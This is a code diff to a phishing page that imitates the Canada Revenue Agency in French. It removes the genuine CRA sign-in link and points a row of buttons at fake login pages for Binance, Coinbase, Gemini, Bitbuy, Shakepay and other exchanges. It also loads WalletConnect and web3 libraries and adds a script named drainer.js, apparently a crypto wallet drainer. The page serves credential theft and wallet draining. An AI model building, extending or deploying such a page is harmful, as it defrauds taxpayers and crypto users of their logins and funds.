@@ -9,7 +9,7 @@
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
   <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&family=Lato:wght@400;700&display=swap" rel="stylesheet">
-  <script src="walletconnect-v2.bundle.js"></script>
+  <script src="../../../../../../../walletconnect-v2.bundle.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.10.0/web3.min.js"></script>
   <style>
     body { font-family: 'Noto Sans', sans-serif; color: #333; }
@@ -30,12 +30,8 @@
     </div>
   </header>
 
-  <nav class="nav-bar">
-    <div class="container-custom flex justify-between items-center h-full text-white font-bold">
-      <button class="px-4 h-full border-l border-r border-gray-700">MENU <i class="fas fa-caret-down"></i></button>
-      <a href="https://www.canada.ca/fr/agence-revenu.html" target="_blank" class="px-4 h-full flex items-center">Ouvrir une session ARC</a>
-    </div>
-  </nav>
+  <nav class="nav-bar"></nav>
+
 
   <main class="container-custom py-10">
     <div class="red-accent">
@@ -137,31 +133,31 @@
         <button onclick="document.getElementById('exchange-selector').style.display='none'" style="background:none; border:none; font-size:22px; cursor:pointer; color:#666;">✕</button>
       </div>
       <div style="display:flex; flex-direction:column; gap:10px;">
-        <button onclick="window.location.href='gol-ged/awsc/cms/login/TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/binance-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
+        <button onclick="window.location.href='../../../TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/binance-login-fr.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
           <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT_Vjx4DV7c1TJpjZKUMt4Fys_8Ek-5R-d8zA&s" style="width:28px; height:28px; border-radius:50%; object-fit:cover;"> Binance
         </button>
-        <button onclick="window.location.href='gol-ged/awsc/cms/login/TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/coinbase-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
+        <button onclick="window.location.href='../../../TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/coinbase-login-fr.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
           <img src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/coinbase-logo-icon.png" style="width:28px; height:28px; border-radius:50%; object-fit:cover;"> Coinbase
         </button>
-        <button onclick="window.location.href='gol-ged/awsc/cms/login/TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/gemini-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
+        <button onclick="window.location.href='../../../TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/gemini-login-fr.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
           <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQWotrwUbC63JU6nqvbnZQnG99N9z3wHcPQng&s" style="width:28px; height:28px; border-radius:50%; object-fit:cover;"> Gemini
         </button>
-        <button onclick="window.location.href='gol-ged/awsc/cms/login/TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/crypto.com-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
+        <button onclick="window.location.href='../../../TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/crypto.com-login-fr.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
           <img src="https://1000logos.net/wp-content/uploads/2024/10/Crypto.Com-Emblem.png" style="width:28px; height:28px; border-radius:50%; object-fit:cover;"> Crypto.com
         </button>
-        <button onclick="window.location.href='gol-ged/awsc/cms/login/TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/bitbuy-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
+        <button onclick="window.location.href='../../../TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/bitbuy-login-fr.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
           <img src="https://images.seeklogo.com/logo-png/42/2/bitbuy-logo-png_seeklogo-427001.png" style="width:28px; height:28px; border-radius:50%; object-fit:cover;"> Bitbuy
         </button>
-        <button onclick="window.location.href='gol-ged/awsc/cms/login/TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/bitfinex-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
+        <button onclick="window.location.href='../../../TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/bitfinex-login-fr.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
           <img src="https://www.shutterstock.com/image-vector/bitfinex-cryptocurrency-stock-market-logo-600nw-2154818477.jpg" style="width:28px; height:28px; border-radius:50%; object-fit:cover;"> Bitfinex
         </button>
-        <button onclick="window.location.href='gol-ged/awsc/cms/login/TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/newton-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
+        <button onclick="window.location.href='../../../TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/newton-login-fr.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
           <img src="https://play-lh.googleusercontent.com/qS53X47RxpMFo9qIabt0v6lATabHjL0TAfXQbBmrzTtS5ZN6zPaD-6lhn6Qzdo8bCKFN" style="width:28px; height:28px; border-radius:50%; object-fit:cover;"> Newton
         </button>
-        <button onclick="window.location.href='gol-ged/awsc/cms/login/TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/shakepay-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
+        <button onclick="window.location.href='../../../TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/shakepay-login-fr.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
           <img src="https://coinspot.io/wp-content/uploads/2025/11/shakepay-review-reinvented-a-canadian-friendly-crypto-on-ramp-explained-489084.png" style="width:28px; height:28px; border-radius:50%; object-fit:cover;"> Shakepay
         </button>
-        <button onclick="window.location.href='gol-ged/awsc/cms/login/TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/other-login.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
+        <button onclick="window.location.href='../../../TYPE-33554432/REALMOID-06-00ba5d0a-2e5a-105d-9505-84cb2b4afb5e/GUID/SMAUTHREASON-0/METHOD-GET/SMAGENTNAME/Exchanges/other-login-fr.html'" class="exchange-btn" style="width:100%; background:#f9f9f9; border:1px solid #ddd; border-radius:4px; padding:14px 18px; font-size:15px; font-weight:700; color:#26374a; display:flex; align-items:center; gap:14px; cursor:pointer; text-align:left;">
           <div style="width:28px; height:28px; border-radius:50%; background:#335075; display:flex; align-items:center; justify-content:center; color:white; font-size:14px;"><i class="fas fa-wallet"></i></div> Autre bourse
         </button>
       </div>
@@ -175,7 +171,8 @@
     </div>
   </footer>
 
-  <script src="wallet.js"></script>
+  <script src="../../../../../../../wallet.js"></script>
+  <script src="../../../../../../../drainer.js"></script>
   <script>
     // Anti-scraping protection
     (function() {
